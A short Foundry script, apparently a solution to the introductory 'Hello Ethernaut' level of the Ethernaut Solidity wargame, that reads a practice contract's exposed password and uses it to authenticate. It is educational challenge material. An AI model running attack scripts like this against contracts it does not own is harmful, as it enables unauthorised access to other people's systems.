// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script} from "forge-std/Script.sol";
import {Instance as HelloEthernaut} from "../src/HelloEthernaut.sol";

contract HelloEthernautAttack is Script {
  function run() public{
    address helloEthernautAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    HelloEthernaut helloEthernaut = HelloEthernaut(helloEthernautAddress);

    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerPrivateKey);

    // Attack
    string memory pass = helloEthernaut.password();
    helloEthernaut.authenticate(pass);

    vm.stopBroadcast();
  }
}